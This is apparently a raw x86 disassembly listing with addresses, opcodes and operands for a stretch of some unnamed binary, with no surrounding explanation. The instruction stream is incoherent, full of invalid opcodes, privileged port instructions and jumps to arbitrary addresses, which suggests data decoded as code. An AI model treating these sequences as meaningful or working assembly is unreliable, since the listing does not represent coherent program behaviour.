  413dc4:	xchg   ecx,eax
  413dc5:	add    eax,0x3804284c
  413dca:	push   esp
  413dcb:	mov    ebx,0xcec7dc8c
  413dd0:	std    
  413dd1:	ja     0x413db5
  413dd3:	add    BYTE PTR [ebp-0x1dfff6ce],dh
  413dd9:	mov    bh,0xd4
  413ddb:	jns    0x413e05
  413ddd:	xor    eax,0xcfa8dd82
  413de2:	cli    
  413de3:	jle    0x413d73
  413de5:	out    0x8,al
  413de7:	add    cl,ch
  413de9:	add    BYTE PTR [ebx],bh
  413deb:	xchg   esp,eax
  413dec:	hlt    
  413ded:	add    BYTE PTR [ecx+ecx*1-0x79],dh
  413df1:	sahf   
  413df2:	in     eax,dx
  413df3:	fist   DWORD PTR [esi]
  413df5:	push   0xe900cc8f
  413dfa:	xor    al,BYTE PTR [eax]
  413dfc:	mov    ch,0x5d
  413dfe:	out    dx,eax
  413dff:	or     DWORD PTR [eax],eax
  413e01:	sbb    BYTE PTR [ebx+ecx*8+0x4b],bh
  413e05:	push   ecx
  413e06:	mov    bl,0x4d
  413e08:	clc    
  413e09:	jmp    0x47eac43d
  413e0e:	addr16 retf 
  413e10:	xchg   DWORD PTR [ecx],esi
  413e12:	ins    DWORD PTR es:[edi],dx
  413e13:	call   0xb9b59e35
  413e18:	out    dx,al
  413e19:	pusha  
  413e1a:	ins    DWORD PTR es:[edi],dx
  413e1b:	add    edi,ebp
  413e1d:	jo     0x413dc1
  413e1f:	sbb    eax,ecx
  413e21:	jo     0x413e96
  413e23:	dec    ecx
  413e24:	loope  0x413e69
  413e26:	cwde   
  413e27:	sahf   
  413e28:	stos   BYTE PTR es:[edi],al
  413e29:	fmul   DWORD PTR [eax-0x7d8f28e7]
  413e2f:	mov    eax,esp
  413e31:	fisub  WORD PTR [ebp-0x42f8304e]
  413e37:	retf   
  413e38:	pop    es
  413e39:	sti    
  413e3a:	mov    edx,0x2dd1bfd9
  413e3f:	clc    
  413e40:	(bad)  
  413e41:	jo     0x413e33
  413e43:	dec    eax
  413e44:	loope  0x413e1c
  413e46:	xor    eax,0xca1800c6
  413e4b:	nop
  413e4c:	fadd   DWORD PTR [eax]
  413e4e:	add    cl,cl
  413e50:	lods   eax,DWORD PTR ds:[esi]
  413e51:	or     BYTE PTR [ecx],dh
  413e53:	retf   0xd094
  413e56:	shl    eax,0xb
  413e59:	sub    eax,0x7dca51c8
  413e5e:	jecxz  0x413e5b
  413e60:	sbb    DWORD PTR [edi],ebp
  413e62:	xor    edi,ecx
  413e64:	add    DWORD PTR [ebp+0x2ad99d8],0x31
  413e6b:	call   0x2ebd:0xa0c1c894
  413e72:	rol    BYTE PTR [ecx-0x36],1
  413e75:	jge    0x413e5a
  413e77:	daa    
  413e78:	fiadd  WORD PTR [eax]
  413e7a:	add    cl,ch
  413e7c:	add    BYTE PTR [ebp+0x10ad49d8],0x31
  413e83:	dec    ecx
  413e84:	xchg   esp,eax
  413e85:	enter  0xf0c1,0x8
  413e89:	sub    eax,0x7dca11d0
  413e8e:	jecxz  0x413e17
  413e90:	or     eax,0x82790f0b
  413e95:	xchg   DWORD PTR [ebp+0x50],eax
  413e98:	retf   
  413e99:	fild   WORD PTR [ecx+ebp*2]
  413e9c:	rol    DWORD PTR [ebp+0x807cb18],1
  413ea2:	add    al,0xe3
  413ea4:	pop    es
  413ea5:	or     BYTE PTR [ecx+0x5b5dfd48],cl
  413eab:	shl    DWORD PTR [eax+0xc40c259],1
  413eb1:	dec    edi
  413eb2:	push   esi
  413eb3:	add    bl,al
  413eb5:	add    BYTE PTR [esp+ecx*1],ah
  413eb8:	mov    esi,0x8247490
  413ebd:	xor    si,0x3827
  413ec2:	int    0xf
  413ec4:	mov    esi,0x31b70bca
  413ec9:	jb     0x413efc
  413ecb:	mov    esi,DWORD PTR [edx-0x56]
  413ece:	xor    eax,ebp
  413ed0:	fs int3 
  413ed2:	aam    0xfd
  413ed4:	mov    DWORD PTR [esi+0x4d],edi
  413ed7:	aas    
  413ed8:	xor    edx,ecx
  413eda:	or     ah,bh
  413edc:	out    0x76,al
  413ede:	add    al,0xb5
  413ee0:	out    0x7,eax
  413ee2:	das    
  413ee3:	call   0xfe15ab58
  413ee8:	pop    ecx
  413ee9:	es dec ebp
  413eeb:	aas    
  413eec:	xor    DWORD PTR [edx-0x71410634],ecx
  413ef2:	xor    ebx,DWORD PTR [ecx-0xd]
  413ef5:	mov    ecx,0x94b85301
  413efa:	xor    DWORD PTR [eax+0x2],edx
  413efd:	sub    edi,DWORD PTR [esi]
  413eff:	or     BYTE PTR [edx-0x374fa34],ch
  413f05:	sub    DWORD PTR [edi],ebp
  413f07:	push   eax
  413f08:	cdq    
  413f09:	ins    BYTE PTR es:[edi],dx
  413f0a:	aad    0xfd
  413f0c:	xchg   cl,cl
  413f0e:	dec    ebp
  413f0f:	je     0x413f01
  413f11:	mov    cl,0x86
  413f13:	inc    ebx
  413f14:	jns    0x413eb7
  413f16:	jmp    0xfeae4010
  413f1b:	shr    DWORD PTR [eax+0x5d],cl
  413f1e:	jge    0x413f62
  413f20:	add    BYTE PTR [esp+esi*2+0x184950d9],ch
  413f27:	aad    0xfd
  413f29:	dec    esi
  413f2a:	mov    DWORD PTR [ebp+0x73],ecx
  413f2d:	lock mov cl,0x86
  413f30:	inc    ebx
  413f31:	cmp    DWORD PTR [ecx-0x39ca2617],esp
  413f37:	rcl    DWORD PTR [ecx-0x44],1
  413f3a:	jne    0x413f15
  413f3c:	push   eax
  413f3d:	sbb    DWORD PTR [ebx],esi
  413f3f:	aad    0xfd
  413f41:	push   ds
  413f42:	or     al,BYTE PTR [edx+0x7d]
  413f45:	add    eax,0xefca965
  413f4a:	pop    esi
  413f4b:	pusha  
  413f4c:	jmp    0x3738f501
  413f51:	addr16 xchg edx,eax
  413f53:	and    al,0xfc
  413f55:	test   eax,0x7280eb3c
  413f5a:	rcl    DWORD PTR [edi],0x37
  413f5d:	fld    st(3)
  413f5f:	mov    dl,0xd3
  413f61:	fcom   QWORD PTR [esp+ebp*1-0x55757e2c]
  413f68:	cld    
  413f69:	popa   
  413f6a:	mov    cl,0x84
  413f6c:	iret   
  413f6d:	(bad)  
  413f6e:	(bad)  
  413f6f:	call   DWORD PTR [edi+0x45]
  413f72:	dec    eax
  413f73:	out    0x80,eax
  413f75:	jb     0x413f38
  413f77:	pop    ss
  413f78:	fadd   st(4),st
  413f7a:	lds    esi,FWORD PTR [esi-0x2d]
  413f7d:	add    BYTE PTR [ecx],bl
  413f7f:	cmp    eax,0x943144f3
  413f84:	lods   al,BYTE PTR ds:[esi]
  413f85:	rol    DWORD PTR [ecx],cl
  413f87:	mov    cl,0x70
  413f89:	ror    BYTE PTR [esi+eax*8-0x6d7ace9e],1
  413f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f91:	shl    DWORD PTR [esi-0x2582bcb4],cl
  413f97:	mov    eax,0x47e5d7cf
  413f9c:	out    0x80,eax
  413f9e:	repnz rcl BYTE PTR [edi+0x26c4ccdb],0xd3
  413fa6:	leave  
  413fa7:	mov    esp,0x94314493
  413fac:	lods   al,BYTE PTR ds:[esi]
  413fad:	shl    ecx,cl
  413faf:	mov    al,0x88
  413fb1:	iret   
  413fb2:	cmp    al,0xc6
  413fb4:	jb     0x413fe7
  413fb6:	xor    eax,0xb6d3a492
  413fbb:	dec    ebx
  413fbc:	add    ch,dh
  413fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fbf:	(bad)  
  413fc0:	lock add DWORD PTR [esi-0x4e16c0c6],0xed39f849
  413fcb:	dec    ebx
  413fcc:	cld    
  413fcd:	(bad)  
  413fce:	jecxz  0x414000
  413fd0:	je     0x414026
  413fd2:	je     0x413fdd
  413fd4:	mov    ebp,DWORD PTR [ebx*8+0x100e858]
  413fdb:	(bad)  
  413fdc:	std    
  413fdd:	pop    ds
  413fde:	mov    al,0x49
  413fe0:	clc    
  413fe1:	sbb    DWORD PTR [eax],eax
  413fe3:	std    
  413fe4:	test   al,0xf9
  413fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fe7:	add    ecx,DWORD PTR [eax-0x6df70e3a]
  413fed:	inc    ebx
  413fee:	cdq    
  413fef:	add    dh,BYTE PTR [ecx-0x3c1c6d2f]
  413ff5:	pop    esi
  413ff6:	and    dh,BYTE PTR [esi*4-0x3a5554a5]
  413ffd:	push   esp
  413ffe:	pusha  
  413fff:	cdq    
  414000:	inc    ebp
  414001:	in     al,dx
  414002:	pop    ebp
  414003:	xor    eax,0x58ba0009
  414008:	pop    esp
  414009:	mov    DWORD PTR [edx+ecx*4-0x4e1a8c70],edi
  414010:	mov    DWORD PTR [eax+0x50c3634f],eax
  414016:	push   ecx
  414017:	mov    eax,ds:0xce9fdc5
  41401c:	or     DWORD PTR [eax+0x3d],ebp
  41401f:	or     DWORD PTR [esi],eax
  414021:	add    BYTE PTR [ecx-0x1b],al
  414024:	(bad)  
  414025:	std    
  414026:	es cmp eax,0x666b8adb
  41402c:	cmp    DWORD PTR [edi],edi
  41402e:	jmp    0xab734cfd
  414033:	mov    bh,0xc2
  414035:	or     BYTE PTR [eax],al
  414037:	lods   al,BYTE PTR ds:[esi]
  414038:	fadd   st(3),st
  41403a:	test   DWORD PTR [eax+0x19fffbda],esi
  414040:	or     DWORD PTR [eax],eax
  414042:	add    BYTE PTR [ebx],dh
  414044:	cld    
  414045:	test   al,dh
  414047:	add    BYTE PTR [ecx-0x10018b74],ah
  41404d:	fisubr DWORD PTR ds:0x871df3d2
  414053:	test   DWORD PTR [edi+edx*8-0x5],esp
  414057:	inc    DWORD PTR [ecx-0x50018374]
  41405d:	(bad)  
  41405f:	test   DWORD PTR [edi+edx*8],esp
  414062:	sti    
  414063:	call   DWORD PTR [ebx+0x44]
  414066:	jl     0x414066
  414068:	(bad)  
  414069:	fimul  DWORD PTR [ebx]
  41406b:	mov    esi,0x7fe08ddb
  414070:	push   ebx
  414071:	xchg   esp,eax
  414072:	jl     0x414072
  414074:	scas   eax,DWORD PTR es:[edi]
  414075:	fimul  DWORD PTR [ebx]
  414077:	mov    dh,0xef
  414079:	pop    ss
  41407a:	clc    
  41407b:	mov    BYTE PTR [ecx+0x5bffffd2],bl
  414081:	dec    ebx
  414082:	jg     0x41407e
  414084:	nop
  414085:	push   ebx
  414086:	add    DWORD PTR [eax-0x398ef2ad],eax
  41408c:	mov    BYTE PTR [edx],0xe8
  41408f:	imul   ebx,esi,0xffffffd9
  414092:	sti    
  414093:	xor    DWORD PTR [ebp-0x100001ab],0xc
  41409a:	cmp    BYTE PTR [ebx],0x58
  41409d:	pop    ebx
  41409e:	mov    ds:0xfe54dd83,eax
  4140a3:	dec    DWORD PTR [edi]
  4140a5:	or     eax,0x8bdd9e71
  4140aa:	cmp    dh,0x0
  4140ad:	das    
  4140ae:	ficom  DWORD PTR [eax-0x18]
  4140b1:	xor    DWORD PTR [ebx+0x73310002],edx
  4140b7:	das    
  4140b8:	pop    ecx
  4140b9:	test   al,0x1e
  4140bb:	sub    eax,0x36b239c2
  4140c0:	xchg   DWORD PTR [ecx+esi*1],ecx
  4140c3:	loopne 0x414051
  4140c5:	xor    BYTE PTR [edx+0x37f5101],dh
  4140cb:	jnp    0x414128
  4140cd:	cmp    DWORD PTR [edi],esi
  4140cf:	push   esi
  4140d0:	or     al,0xb4
  4140d2:	xor    al,0x81
  4140d4:	(bad)  
  4140d5:	(bad)  
  4140d6:	shl    BYTE PTR [ecx],cl
  4140d8:	call   0x42f2d3
  4140dd:	pop    ebx
  4140de:	mov    dl,0x59
  4140e0:	hlt    
  4140e1:	pop    esp
  4140e2:	icebp  
  4140e3:	add    ebp,eax
  4140e5:	add    dh,BYTE PTR [ebp-0x30]
  4140e8:	std    
  4140e9:	and    BYTE PTR [eax+0x1cc5827b],al
  4140ef:	inc    ecx
  4140f0:	add    BYTE PTR [ecx-0x4dbdec4b],bh
  4140f6:	xchg   edi,eax
  4140f7:	icebp  
  4140f8:	jnp    0x4140ba
  4140fa:	jb     0x414082
  4140fc:	js     0x4140ad
  4140fe:	inc    edx
  4140ff:	sar    bh,1
  414101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414102:	mov    cl,0x1
  414104:	jmp    0x88126a0e
  414109:	lods   al,BYTE PTR ds:[esi]
  41410a:	in     eax,0xcf
  41410c:	std    
  41410d:	mov    fs,WORD PTR [eax]
  41410f:	mov    dh,0xe9
  414111:	add    BYTE PTR [ecx+0x27],al
  414114:	xchg   BYTE PTR [edi+edi*2+0x52],dh
  414118:	rol    BYTE PTR [edi-0x2303254],1
  41411e:	outs   dx,BYTE PTR ds:[esi]
  41411f:	add    al,BYTE PTR [esi-0x3005988c]
  414125:	mov    DWORD PTR [ebp+esi*2+0x856fdcf],ebp
  41412c:	not    BYTE PTR [ecx+0x50078830]
  414132:	mov    eax,0x3cd19385
  414137:	ret    
  414138:	ficomp WORD PTR [ecx+0x7afef9f4]
  41413e:	cs int 0xea
  414141:	add    esi,DWORD PTR [eax+0x47]
  414144:	push   0xffffffcd
  414146:	inc    ecx
  414147:	inc    esp
  414148:	in     al,0x83
  41414a:	pop    eax
  41414b:	or     DWORD PTR [esi+eax*8+0x67],ebx
  41414f:	pop    ebx
  414150:	iret   
  414151:	into   
  414152:	or     al,bl
  414154:	(bad)  
  414155:	adc    edx,0x41
  414158:	int    0xcf
  41415a:	hlt    
  41415b:	or     DWORD PTR [edi+0xb],esp
  41415e:	xor    DWORD PTR [esi+eax*4],edi
  414161:	sub    DWORD PTR [edx-0x23304abf],0x9
  414168:	xor    al,0x6e
  41416a:	stos   BYTE PTR es:[edi],al
  41416b:	mov    WORD PTR [edi-0x32],fs
  41416e:	int3   
  41416f:	ret    0xdc37
  414172:	mov    cs,WORD PTR [ecx]
  414174:	out    0x3,eax
  414176:	add    BYTE PTR [ebx+eiz*2+0x32],bl
  41417a:	jge    0x414141
  41417c:	fs test eax,0x1557aefc
  414182:	aaa    
  414183:	mov    eax,0x14f3cb4d
  414188:	mov    cs,WORD PTR [ebx]
  41418a:	sub    BYTE PTR ds:0x2ab6c2b,bh
  414190:	push   cs
  414191:	jo     0x414159
  414193:	mov    edx,0xbb65f741
  414198:	or     bh,ah
  41419a:	fisubr DWORD PTR [ecx]
  41419c:	xchg   esp,eax
  41419d:	mov    bh,0xf3
  41419f:	mov    bh,0xca
  4141a1:	lds    edx,FWORD PTR [ebx+eax*4]
  4141a4:	adc    al,BYTE PTR [eax]
  4141a6:	jle    0x41414b
  4141a8:	push   edi
  4141a9:	sub    DWORD PTR [ecx],0x6de85255
  4141af:	data16 (bad) 
  4141b1:	std    
  4141b2:	xchg   ecx,eax
  4141b3:	pop    esi
  4141b4:	cmp    eax,0xff5ae93f
  4141b9:	test   BYTE PTR [esi],0x66
  4141bc:	adc    al,0xb5
  4141be:	and    ah,BYTE PTR [edx+0x5c]
  4141c1:	call   0xfe05413f
  4141c6:	add    DWORD PTR [esi-0x516c0ca],0xffe6f6ea
  4141d0:	adc    esi,DWORD PTR [ebp-0x17a4bc3e]
  4141d6:	xor    eax,0x2efdc3e6
  4141db:	add    BYTE PTR [edi+0x60],al
  4141de:	ret    0x32f1
  4141e1:	pop    eax
  4141e2:	mov    DWORD PTR ds:0xc1511119,ebx
  4141e8:	fstp   TBYTE PTR [edx-0x38525103]
  4141ee:	sub    cl,0x32
  4141f1:	or     DWORD PTR [eax+0x25e95],edi
  4141f7:	(bad)  
  4141f9:	mov    dl,BYTE PTR [ecx]
  4141fb:	push   0xfffffff2
  4141fd:	or     al,0x81
  4141ff:	stos   BYTE PTR es:[edi],al
  414200:	ss (bad) 
  414202:	jae    0x4141f8
  414204:	in     eax,dx
  414205:	or     BYTE PTR [edx-0x7a],dh
  414208:	stos   BYTE PTR es:[edi],al
  414209:	cmp    al,0x73
  41420b:	sub    BYTE PTR ds:0x83701090,ch
  414211:	mov    al,al
  414213:	in     eax,0xb3
  414215:	mov    DWORD PTR [esp+edx*1],0xe93f3559
  41421c:	loopne 0x4141d1
  41421e:	pop    ecx
  41421f:	add    BYTE PTR [edx],bl
  414221:	or     al,BYTE PTR [eax]
  414223:	push   ebx
  414224:	jecxz  0x414217
  414226:	and    ecx,DWORD PTR [eax]
  414228:	mov    ebx,0x7f8e8dd
  41422d:	sar    DWORD PTR [ebp-0x3d],cl
  414230:	fadd   DWORD PTR ds:0xd9d00000
  414236:	je     0x414279
  414238:	dec    eax
  414239:	ds jns 0x500c878
  414240:	add    BYTE PTR [ebx-0x63c2fb34],bl
  414246:	popa   
  414247:	cmp    eax,0xb8df9a00
  41424c:	je     0x4141eb
  41424e:	inc    ebp
  41424f:	add    BYTE PTR [ebx-0x7cefbbf5],cl
  414255:	fist   DWORD PTR [ecx]
  414257:	jg     0x414219
  414259:	or     al,0x10
  41425b:	hlt    
  41425c:	jne    0x4142a7
  41425e:	add    eax,0xcb13ef72
  414263:	add    al,0x0
  414265:	cmp    eax,0xf483e144
  41426a:	lods   eax,DWORD PTR ds:[esi]
  41426b:	push   eax
  41426c:	push   esi
  41426d:	push   ebx
  41426e:	lock pop es
  414270:	mov    ebp,DWORD PTR ds:0x90458909
  414276:	cmc    
  414277:	dec    esi
  414278:	call   0x3d1032
  41427d:	push   ebp
  41427e:	dec    eax
  41427f:	lock push eax
  414281:	and    eax,0xc050084a
  414286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414287:	clc    
  414288:	jmp    DWORD PTR [edi]
  41428a:	inc    eax
  41428b:	inc    ecx
  41428c:	call   0x1100ccc9
  414291:	retf   
  414292:	in     al,0xcf
  414294:	clc    
  414295:	out    0xcd,eax
  414297:	push   0x42de3174
  41429c:	add    BYTE PTR [ebp+eiz*2-0x3aa6af37],ah
  4142a3:	retf   0xfd
  4142a6:	data16 ficom DWORD PTR [ebp+0x74]
  4142aa:	lock mov cl,0x7e
  4142ad:	inc    ebx
  4142ae:	popa   
  4142af:	mov    ds:0xe7486dd9,al
  4142b4:	retf   0xbd68
  4142b7:	xchg   ebp,eax
  4142b8:	inc    edx
  4142b9:	add    BYTE PTR [ebp+ebp*2-0x6eb6af27],ch
  4142c0:	retf   0x2efd
  4142c3:	cmp    ebp,DWORD PTR ds:0xd164bafc
  4142c9:	xchg   DWORD PTR [esi+esi*4+0x7a],esi
  4142cd:	pop    ebx
  4142ce:	and    DWORD PTR [ebx],ebp
  4142d0:	sub    eax,0xdbecbaf4
  4142d5:	xchg   DWORD PTR [esi+edx*8+0x7a],ebp
  4142d9:	pop    ebx
  4142da:	or     DWORD PTR [edx-0x28],ecx
  4142dd:	je     0x41434f
  4142df:	mov    dl,0x7e
  4142e1:	inc    ebx
  4142e2:	jmp    0xe87b1f08
  4142e7:	jle    0x4142b5
  4142e9:	push   0x40fde5
  4142ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142ef:	in     al,0xd3
  4142f1:	push   eax
  4142f2:	(bad)  
  4142f4:	retf   0xc6fd
  4142f7:	sbb    eax,ebx
  4142f9:	je     0x41436b
  4142fb:	mov    dl,0x7e
  4142fd:	inc    ebx
  4142fe:	leave  
  4142ff:	add    esp,ebx
  414301:	sbb    eax,0x89cc86a8
  414306:	add    al,0x3e
  414308:	js     0x41434d
  41430a:	add    BYTE PTR [ecx-0x5703b9d8],ah
  414310:	or     al,0xd4
  414312:	mov    esp,ebp
  414314:	or     BYTE PTR [ebx+0x78],bl
  414317:	repnz mov al,0x70
  41431a:	inc    esi
  41431b:	test   DWORD PTR [ecx+0x3509dbb4],edx
  414321:	aam    0x42
  414323:	xor    DWORD PTR [esi-0x4efe3454],ecx
  414329:	inc    eax
  41432a:	retf   
  41432b:	pop    esp
  41432c:	mov    edi,0x49e257bf
  414331:	out    0x7e,eax
  414333:	repnz mov eax,0xc058dbb7
  414339:	push   ds
  41433a:	int3   
  41433b:	leave  
  41433c:	xor    al,0x9c
  41433e:	inc    edx
  41433f:	xor    DWORD PTR [esi-0x4e7e245c],ecx
  414345:	and    al,0xcb
  414347:	and    al,0xbf
  414349:	xchg   ebp,eax
  41434a:	jle    0x4143be
  41434c:	rcl    DWORD PTR [edi-0x113e5225],0xcb
  414353:	mov    edx,0xba33ef47
  414358:	inc    esp
  414359:	xlat   BYTE PTR ds:[ebx]
  41435a:	xor    al,0x9
  41435c:	aaa    
  41435d:	iret   
  41435e:	retf   
  41435f:	hlt    
  414360:	mov    ah,BYTE PTR [ebp+0x2c8c84f4]
  414366:	fadd   QWORD PTR [ecx-0x2333ae4f]
  41436c:	mov    esi,0xae002f15
  414371:	lods   eax,DWORD PTR ds:[esi]
  414372:	or     al,0xc6
  414374:	cmp    DWORD PTR [ecx],ecx
  414376:	cmp    al,0x7d
  414378:	ror    BYTE PTR [eax-0x41418775],cl
  41437e:	out    0x36,eax
  414380:	pop    edi
  414381:	push   esi
  414382:	bound  ebp,QWORD PTR [ecx]
  414384:	cmp    DWORD PTR [edx-0x7b440804],edx
  41438a:	addr16 retf 0xbe9c
  41438e:	add    BYTE PTR [ecx],bl
  414390:	jne    0x4143e7
  414392:	(bad)  
  414393:	outs   dx,BYTE PTR ds:[esi]
  414394:	jp     0x4143c9
  414396:	add    cl,dl
  414398:	jbe    0x4143d4
  41439a:	aas    
  41439b:	jmp    0x573ce9fa
  4143a0:	push   0xffffffee
  4143a2:	shl    DWORD PTR [ebx-0x49],1
  4143a5:	mov    ch,0x73
  4143a7:	test   al,0x32
  4143a9:	xchg   ecx,eax
  4143aa:	add    al,0xfb
  4143ac:	hlt    
  4143ad:	xchg   edx,edi
  4143af:	shr    esi,1
  4143b1:	lods   eax,DWORD PTR ds:[esi]
  4143b2:	lds    esp,FWORD PTR [ebp+edi*8-0x42]
  4143b6:	std    
  4143b7:	es sub al,0x9
  4143ba:	add    cl,ch
  4143bc:	pop    edi
  4143bd:	push   ebp
  4143be:	xchg   DWORD PTR [ecx],ebx
  4143c0:	mov    ah,0x89
  4143c2:	je     0x4143d3
  4143c4:	cli    
  4143c5:	mov    ebx,0xf9061b2f
  4143ca:	mov    BYTE PTR [ecx+eax*4-0x41],ah
  4143ce:	std    
  4143cf:	not    BYTE PTR [ebp+0xef7c8a]
  4143d5:	sti    
  4143d6:	mov    ebx,0xbf766cfd
  4143db:	std    
  4143dc:	fidivr WORD PTR [edi-0x6e]
  4143df:	jl     0x4143b8
  4143e1:	jmp    0x41439e
  4143e3:	or     eax,0xe088378f
  4143e8:	inc    esi
  4143e9:	data16 cmp BYTE PTR [edi+edi*4-0x15],0xbb
  4143ef:	or     eax,0xf7ee2b7f
  4143f4:	popa   
  4143f5:	xor    eax,0x6fe901c7
  4143fa:	dec    ebx
  4143fb:	and    DWORD PTR [ebx+0x690342ca],0xa7730927
  414405:	pusha  
  414406:	push   edi
  414407:	call   0xfc147c0c
  41440c:	dec    DWORD PTR [ebx]
  41440e:	imul   edi,DWORD PTR [eax-0x2],0x8000d31f
  414415:	ret    
  414416:	or     DWORD PTR [ecx-0x59],esi
  414419:	sbb    edx,DWORD PTR [ecx-0x2d200188]
  41441f:	add    BYTE PTR [ebp-0x2],dh
  414422:	inc    eax
  414423:	add    DWORD PTR [eax+0x50fbd2fe],0xfff9d000
  41442d:	pop    ds
  41442e:	repz pop ebp
  414430:	pop    ebx
  414431:	rcl    ebp,1
  414433:	pop    ecx
  414434:	ret    0x950
  414437:	push   ecx
  414438:	mov    DWORD PTR [eax],eax
  41443a:	xor    eax,0x86534ffa
  41443f:	ds push ecx
  414441:	or     bl,dl
  414443:	lock or ecx,DWORD PTR [ebx-0x36d1473b]
  41444a:	mov    ds:0xd4880ebc,al
  41444f:	shl    ebp,0x8a
  414452:	add    al,0xb6
  414454:	test   DWORD PTR [ecx+eiz*8],eax
  414457:	inc    ebp
  414458:	jg     0x414453
  41445a:	add    BYTE PTR [ebp-0x17],al
  41445d:	push   ebx
  41445e:	cmp    bl,ch
  414460:	lods   al,BYTE PTR ds:[esi]
  414461:	cli    
  414462:	(bad)  
  414464:	sub    eax,0x17c18dd2
  414469:	mov    dl,ah
  41446b:	push   ss
  41446c:	xor    al,BYTE PTR [ecx]
  41446e:	pusha  
  41446f:	or     BYTE PTR [edx-0x7d],al
  414472:	mov    ds:0xc9f079bd,al
  414477:	jbe    0x414403
  414479:	inc    esp
  41447a:	(bad)
  41447d:	add    al,0xda
  41447f:	inc    esi
  414480:	jg     0x41447c
  414482:	xor    DWORD PTR [edx-0x8f00ebb],ebp
  414488:	js     0x414476
  41448a:	add    al,0x70
  41448c:	clc    
  41448d:	call   FWORD PTR [esi+0x310001b2]
  414493:	mov    dl,0x1
  414495:	add    BYTE PTR [ecx],dh
  414497:	mov    dl,0x1
  414499:	add    BYTE PTR [ecx],dh
  41449b:	mov    dl,0x1
  41449d:	add    BYTE PTR [eax],al
  41449f:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144a5:	add    DWORD PTR [eax],eax
  4144a7:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144ad:	add    DWORD PTR [eax],eax
  4144af:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144b5:	add    DWORD PTR [eax],eax
  4144b7:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144bd:	add    DWORD PTR [eax],eax
  4144bf:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144c5:	add    DWORD PTR [eax],eax
  4144c7:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144cd:	add    DWORD PTR [eax],eax
  4144cf:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144d5:	add    DWORD PTR [eax],eax
  4144d7:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144dd:	add    DWORD PTR [eax],eax
  4144df:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144e5:	add    DWORD PTR [eax],eax
  4144e7:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144ed:	add    DWORD PTR [eax],eax
  4144ef:	xor    DWORD PTR [edx-0x4dceffff],esi
  4144f5:	add    DWORD PTR [eax],eax
  4144f7:	xor    DWORD PTR [edx+0x9310001],esi
  4144fd:	out    0x3,eax
  4144ff:	xor    DWORD PTR [ecx],ecx
  414501:	out    0x3,eax
  414503:	add    BYTE PTR [ecx],dh
  414505:	or     edi,esp
  414507:	add    esi,DWORD PTR [ecx]
  414509:	or     edi,esp
  41450b:	add    esi,DWORD PTR [ecx]
  41450d:	or     edi,esp
  41450f:	add    esi,DWORD PTR [ecx]
  414511:	or     edi,esp
  414513:	add    esi,DWORD PTR [ecx]
  414515:	or     edi,esp
  414517:	add    esi,DWORD PTR [ecx]
  414519:	or     edi,esp
  41451b:	add    esi,DWORD PTR [ecx]
  41451d:	or     edi,esp
  41451f:	add    esi,DWORD PTR [ecx]
  414521:	or     edi,esp
  414523:	add    esi,DWORD PTR [ecx]
  414525:	or     edi,esp
  414527:	add    esi,DWORD PTR [ecx]
  414529:	or     edi,esp
  41452b:	add    esi,DWORD PTR [ecx]
  41452d:	or     edi,esp
  41452f:	add    esi,DWORD PTR [ecx]
  414531:	or     edi,esp
  414533:	add    esi,DWORD PTR [ecx]
  414535:	or     edi,esp
  414537:	add    esi,DWORD PTR [ecx]
  414539:	or     edi,esp
  41453b:	add    esi,DWORD PTR [ecx]
  41453d:	or     edi,esp
  41453f:	add    esi,DWORD PTR [ecx]
  414541:	or     edi,esp
  414543:	add    esi,DWORD PTR [ecx]
  414545:	or     esp,esp
  414547:	std    
  414548:	cmp    ecx,DWORD PTR [edi]
  41454a:	mov    BYTE PTR [ebx],dh
  41454c:	jne    0x41457e
  41454e:	mov    DWORD PTR [ebx],esp
  414550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414551:	clc    
  414552:	int3   
  414553:	adc    eax,DWORD PTR [esi-0x17]
  414556:	(bad)  
  414557:	push   ss
  414558:	push   ecx
  414559:	jmp    0xe9d3a0d0
  41455e:	pop    ecx
  41455f:	pop    ecx
  414560:	pop    esi
  414561:	sub    eax,0xe983614b
  414566:	pop    edx
  414567:	pop    esp
  414568:	add    BYTE PTR [edx-0x17],dl
  41456b:	dec    eax
  41456c:	popa   
  41456d:	pop    ebp
  41456e:	xor    eax,0xff11524c
  414573:	psubw  mm5,QWORD PTR [eax]
  414576:	inc    esi
  414577:	add    BYTE PTR [esi+0x65],al
  41457a:	xor    dh,BYTE PTR [edx+0x40]
  41457d:	xor    WORD PTR [ecx+ecx*8+0x1a],si
  414582:	sub    BYTE PTR [edi],ah
  414584:	leave  
  414585:	sbb    eax,0x49d136f2
  41458a:	imul   DWORD PTR [edi]
  41458c:	fnstenv ds:0x550061e9
  414592:	dec    edi
  414593:	ins    DWORD PTR es:[edi],dx
  414594:	add    al,0x3
  414596:	and    al,0x63
  414598:	pop    es
  414599:	push   ebp
  41459a:	inc    edx
  41459b:	(bad)  
  41459c:	cli    
  41459d:	adc    DWORD PTR [ebx],ebp
  41459f:	sub    al,0x9
  4145a1:	hlt    
  4145a2:	sub    al,0x6c
  4145a4:	or     DWORD PTR [ebx+0x22],eax
  4145a7:	gs sar esi,0x37
  4145ab:	and    BYTE PTR [ebx-0x449cc82f],bh
  4145b1:	in     al,dx
  4145b2:	and    eax,0x10580f64
  4145b7:	or     esp,ebx
  4145b9:	or     DWORD PTR [edx+esi*2],ebp
  4145bc:	les    edx,FWORD PTR [edx]
  4145be:	and    ch,BYTE PTR [esi-0x71]
  4145c1:	out    0x36,eax
  4145c3:	imul   ecx,DWORD PTR [eax-0x7892de1a],0x38
  4145ca:	jmp    0x7641db36
  4145cf:	cmp    DWORD PTR [edx],edi
  4145d1:	(bad)  
  4145d2:	inc    edi
  4145d3:	xor    al,0x75
  4145d5:	jbe    0x414613
  4145d7:	and    ah,BYTE PTR [edx+0x7a]
